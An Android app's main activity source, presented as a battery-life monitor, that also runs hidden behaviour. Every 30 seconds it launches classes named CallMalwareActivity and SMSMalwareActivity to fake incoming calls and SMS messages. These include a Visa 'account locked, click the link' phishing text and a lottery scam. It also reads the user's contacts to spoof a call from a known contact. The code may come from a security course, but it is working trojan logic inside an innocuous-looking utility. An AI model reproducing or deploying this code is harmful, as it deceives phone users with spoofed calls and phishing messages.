package com.eyad.batterylife;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.widget.TextView;
import java.util.Calendar;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.widget.Toast;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;


public class MainActivity extends AppCompatActivity {

    Calendar calendar = null;
    private TextView batteryLevel;
    private TextView batteryStats;
    final Handler handler = new Handler();
    private int WRITE_CALL_LOG_CODE = 1;
    private int READ_CONTACTS_CODE = 2;
    private boolean flag = false;
    private int numMessage = 1;
    private int numCall= 1;
    private String nameOfContact="";
    private String numberOfContact="";


    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getSupportActionBar().hide();


        batteryLevel = (TextView)findViewById(R.id.battery_level);
        batteryStats = (TextView)findViewById(R.id.battery_stats);

        if (ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)
            fetchContact();
        else
            ActivityCompat.requestPermissions(this,
                    new String[] {Manifest.permission.READ_CONTACTS}, WRITE_CALL_LOG_CODE);


        if (ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.WRITE_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {

            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    callAndReciveSMS();
                    handler.postDelayed(this, 30000);
                }
            }, 30000);


        } else {
            ActivityCompat.requestPermissions(this,
                    new String[] {Manifest.permission.WRITE_CALL_LOG}, WRITE_CALL_LOG_CODE);
        }

    }

    //Function that calls to ringer call or notify SMS
    private void callAndReciveSMS(){
        if(flag) {
            flag = false;
            call();
        }
        else {
            flag = true;
            receiveSMS();
        }
    }


    //Ringer call
    private void call(){
        boolean hasContacts = false;
        String name, number, duration, hangUpAfter;
        name = number = duration = "";
        hangUpAfter = "15";

        if(!nameOfContact.isEmpty()){
            hasContacts = true;
            number = numberOfContact;
            name = nameOfContact;
        }

        switch (numCall){
            case 1:
                if (!hasContacts) {
                    name = "EL AL";
                    number = "036518533";
                }
                duration = "17";
                numCall++;
                break;
            case 2:
                name = "Donald Trump";
                number = "+97298998985";
                duration = "23";
                numCall++;
                break;
            case 3:
                name = "Bill Gates";
                number = "+9728233492";
                duration = "11";
                numCall = 1;
                break;
        }

        calendar = Calendar.getInstance();
        Intent intent = new Intent(this, CallMalwareActivity.class);
        intent.putExtra("name", name);
        intent.putExtra("number", number);
        intent.putExtra("duration", Integer.parseInt(duration));
        intent.putExtra("hangUpAfter", Integer.parseInt(hangUpAfter));
        final int fakeCallID = (int)System.currentTimeMillis();
        PendingIntent pendingIntent = PendingIntent.getActivity(this, fakeCallID, intent, PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmManager = (AlarmManager)getSystemService(ALARM_SERVICE);
        alarmManager.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);
    }


    //Notify SMS
    private void receiveSMS(){
        String name, number, message;
        name = number = message = "";

        switch (numMessage){
            case 1:
                name = "Visa";
                number = "0522887497";
                message = "Visa: Your account has been locked please click on the link to restore your access";
                numMessage++;
                break;
            case 2:
                name = "Winner";
                number = "026524375";
                message = "Your mobile number has won a million dollars";
                numMessage++;
                break;
            case 3:
                name = "Ituran";
                number = "047382249";
                message = "your car has been stolen, Ituran team";
                numMessage = 1;
                break;
        }

        calendar = Calendar.getInstance();
        Intent i = new Intent(getApplicationContext(), SMSMalwareActivity.class);
        i.putExtra("name", name);
        i.putExtra("number", number);
        i.putExtra("message", message);
        final int fakeSMSID = (int)System.currentTimeMillis();
        PendingIntent pi = PendingIntent.getBroadcast(getApplicationContext(), fakeSMSID, i, PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmManager = (AlarmManager)getSystemService(ALARM_SERVICE);
        alarmManager.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pi);
    }


    //Function that display battery info
    private BroadcastReceiver batteryInfoReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            int  health = intent.getIntExtra(BatteryManager.EXTRA_HEALTH,0);
            int  level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL,0);
            int  plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED,0);
            boolean  present = intent.getExtras().getBoolean(BatteryManager.EXTRA_PRESENT);
            int  scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE,0);
            int  status = intent.getIntExtra(BatteryManager.EXTRA_STATUS,0);
            String  technology = intent.getExtras().getString(BatteryManager.EXTRA_TECHNOLOGY);
            int  temperature = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE,0);
            int  voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE,0);

            String battery_level = level + "";
            String battery_states = "Time: " + Calendar.getInstance().getTime() + "\n" +
                    "Level: "+ level + "/" + scale + "\n" +
                    "Health: "+ health + "\n"+
                    "Plugged: " + plugged + "\n" +
                    "Present: " + present + "\n" +
                    "Status: " + status + "\n" +
                    "Technology: " + technology + "\n" +
                    "Temperature: " + ((double)temperature/10) + " °C\n" +
                    "Voltage: " + voltage + "\n";

            batteryLevel.setText(battery_level);
            batteryStats.setText(battery_states);
        }
    };

    @Override
    protected void onResume() {
        super.onResume();
        this.registerReceiver(this.batteryInfoReceiver,	new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
    }


    protected void onPause() {
        super.onPause();
        this.unregisterReceiver(this.batteryInfoReceiver);
    }


    //Function that checks if the user allow permissions
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == WRITE_CALL_LOG_CODE)  {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        callAndReciveSMS();
                        handler.postDelayed(this, 30000);
                    }
                }, 30000);
            } else {
                Toast.makeText(this, "Permission DENIED", Toast.LENGTH_SHORT).show();
            }
        }

        if (requestCode == READ_CONTACTS_CODE)  {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                fetchContact();
            } else {
                Toast.makeText(this, "Permission DENIED", Toast.LENGTH_SHORT).show();
            }
        }
    }


    //Function that get contacts from your phone
    public void fetchContact() {
        String phoneNumber = null;

        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
        String _ID = ContactsContract.Contacts._ID;
        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);

        // Loop for every contact in the phone
        if (cursor.getCount() > 0) {

            while (cursor.moveToNext()) {
                String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
                String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));

                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));

                if (hasPhoneNumber > 0) {

                    // Query and loop for every phone number of the contact
                    Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);

                    while (phoneCursor.moveToNext()) {
                        phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                        nameOfContact = name;
                        numberOfContact = phoneNumber;
                        break;
                    }

                    phoneCursor.close();
                }
                break;
            }
        }
    }
}
